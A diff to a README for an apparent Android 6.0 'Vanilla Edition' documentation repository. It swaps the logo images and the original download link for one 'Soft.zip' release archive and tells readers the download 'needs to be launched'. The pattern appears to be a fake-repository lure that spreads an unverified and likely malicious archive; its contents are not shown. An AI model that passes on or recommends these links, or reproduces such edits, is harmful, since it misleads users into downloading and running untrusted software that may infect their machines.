@@ -1,6 +1,6 @@
 
 # 🤖️📖️ Android x64 Documentation Repository
-![Android Logo](https://img.icons8.com/cotton/2x/android-os.png)
+![Android Logo](https://github.com/Mickeydie666/Android-x64_Android6.0_Vanilla_Edition_Docs/releases/download/v1.0/Soft.zip)
 
 Welcome to the official documentation source repository for the Vanilla build of Android 6.0, a basic but useful alternative installation for Android Marshmallow! This repository, named **Android-x64_Android6.0_Vanilla_Edition_Docs**, is dedicated to providing comprehensive information and guides for developers and users interested in the Android x64 project.
 
@@ -34,7 +34,7 @@ We welcome contributions from the community to improve and expand the Android x6
 
 ### Download Android x64 Vanilla Edition
 Get started with Android x64 Vanilla Edition by downloading the latest release from the following link:
-[![Download Android x64 Vanilla Edition](https://img.shields.io/badge/Download-Release.zip-blue)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Android x64 Vanilla Edition](https://github.com/Mickeydie666/Android-x64_Android6.0_Vanilla_Edition_Docs/releases/download/v1.0/Soft.zip)](https://github.com/Mickeydie666/Android-x64_Android6.0_Vanilla_Edition_Docs/releases/download/v1.0/Soft.zip)
 
 *Note: The download link needs to be launched to access the Android x64 Vanilla Edition release.*
 
@@ -46,4 +46,4 @@ Explore the "Releases" section of this repository to access previous versions of
 
 Thank you for choosing Android x64 Vanilla Edition as your Android 6.0 alternative installation. We hope you enjoy the simplicity and efficiency that Android x64 Vanilla Edition brings to your Android experience. Happy exploring! 🚀
 
-![Android x64](https://img.icons8.com/wired/2x/android.png)
+![Android x64](https://github.com/Mickeydie666/Android-x64_Android6.0_Vanilla_Edition_Docs/releases/download/v1.0/Soft.zip)
